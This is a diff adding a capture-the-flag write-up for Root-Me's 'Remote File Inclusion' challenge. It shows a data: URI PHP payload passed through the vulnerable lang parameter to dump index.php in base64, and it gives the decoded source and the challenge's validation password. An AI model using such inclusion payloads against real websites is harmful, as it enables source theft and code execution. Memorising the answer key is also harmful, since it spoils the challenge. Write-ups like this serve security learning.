@@ -3279,7 +3279,120 @@ DontForgetPHPL00seComp4r1s0n
 ### [Web - Server](#contents) | [Root-Me](./rootme.md) | [Home](./index.md)
 
 ---
-	
+
+## Remote File Inclusion
+
+- Author: g0uZ
+- Date: 25 November 2015
+- Points: 30
+- Level: 3
+
+### Statement
+
+Get the PHP source code.
+
+</details>
+
+### Link
+
+- [ch13](http://challenge01.root-me.org/web-serveur/ch13/)
+
+### Resources
+
+1. [Source code auditing algorithm for detecting LFI and RFI](https://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20Source%20code%20auditing%20algorithm%20for%20detecting%20LFI%20and%20RFI.pdf).
+
+### Solutions
+
+<details>
+
+<summary markdown="span">Solution</summary>
+
+We can visit the website and find a html page with two included webpages:
+
+~~~html
+
+<html>
+<head><title>Remote File Inclusion</title></head>
+
+<body><link rel='stylesheet' property='stylesheet' id='s' type='text/css' href='/template/s.css' media='all' /><iframe id='iframe' src='https://www.root-me.org/?page=externe_header'></iframe>
+
+<h3>
+    Language : 
+    <a href="?lang=fr" style="text-decoration:none">Français</a>
+    &nbsp;|&nbsp;
+    <a href="?lang=en" style="text-decoration:underline">English</a>
+</h3>
+
+<p>Welcome on our new website!</p>
+
+</body>
+</html>
+~~~
+
+We can see the URL changes dependent on language:
+
+~~~
+http://challenge01.root-me.org/web-serveur/ch13/?lang=en
+http://challenge01.root-me.org/web-serveur/ch13/?lang=fr
+~~~
+
+We can see remote files can be loaded onto the webpage by navigating to:
+
+~~~
+http://challenge01.root-me.org/web-serveur/ch13/?lang=http://google.com?
+~~~
+
+This loads the google search engine into the webpage.  We can load the index.php using a short php script:
+
+~~~
+http://challenge01.root-me.org/web-serveur/ch13/?lang=data:text/plain,%3C?php%20echo%20base64_encode(file_get_contents(%22index.php%22));%20?%3E
+~~~
+
+This returns:
+
+~~~
+PD9waHAKCi8qCgpDb25ncmF0eiEKCkxlIG1vdCBkZSBwYXNzZSBkZSB2YWxpZGF0aW9uIGVzdCA6IApUaGUgdmFsaWRhdGlvbiBwYXNzd29yZCBpcyA6IAoKUjNtMHQzX2lTX3IzYUwxeV8zdjFsCgoqLwoKJGxhbmd1YWdlPSJlbiI7CmlmICggaXNzZXQoJF9HRVRbImxhbmciXSkgKXsKICAgICRsYW5ndWFnZSA9ICRfR0VUWyJsYW5nIl07Cn0KaW5jbHVkZSgkbGFuZ3VhZ2UuIl9sYW5nLnBocCIpOwo/PgoKPGh0bWw+CjxoZWFkPjx0aXRsZT5SZW1vdGUgRmlsZSBJbmNsdXNpb248L3RpdGxlPjwvaGVhZD4KCjxib2R5PgoKPGgzPgogICAgPD9waHAgZWNobyAkbGFuZ1snbGFuZyddOyA/PiA6IAogICAgPGEgaHJlZj0iP2xhbmc9ZnIiIHN0eWxlPSJ0ZXh0LWRlY29yYXRpb246PD9waHAgKCRsYW5ndWFnZT09ImZyIik/cHJpbnQgInVuZGVybGluZSI6cHJpbnQgIm5vbmUiOyA/PiI+RnJhbsOnYWlzPC9hPgogICAgJm5ic3A7fCZuYnNwOwogICAgPGEgaHJlZj0iP2xhbmc9ZW4iIHN0eWxlPSJ0ZXh0LWRlY29yYXRpb246PD9waHAgKCRsYW5ndWFnZT09ImVuIik/cHJpbnQgInVuZGVybGluZSI6cHJpbnQgIm5vbmUiOyA/PiI+RW5nbGlzaDwvYT4KPC9oMz4KCjxwPjw/cGhwIGVjaG8gJGxhbmdbIndlbGNvbWUiXTsgPz48L3A+Cgo8L2JvZHk+CjwvaHRtbD4K_lang.php 
+~~~
+
+This can be decoded from Base64:
+
+~~~php
+<?php
+
+/*
+
+Congratz!
+
+Le mot de passe de validation est : 
+The validation password is : 
+
+R3m0t3_iS_r3aL1y_3v1l
+
+*/
+
+...
+~~~
+
+</details>
+
+### Answer
+
+<details>
+
+<summary markdown="span">Answer</summary>
+
+~~~
+R3m0t3_iS_r3aL1y_3v1l
+~~~
+
+</details>
+
+---
+
+### [Web - Server](#contents) | [Root-Me](./rootme.md) | [Home](./index.md)
+
+---
+
 ## SQL injection Authentication
 
 - Author: g0uZ
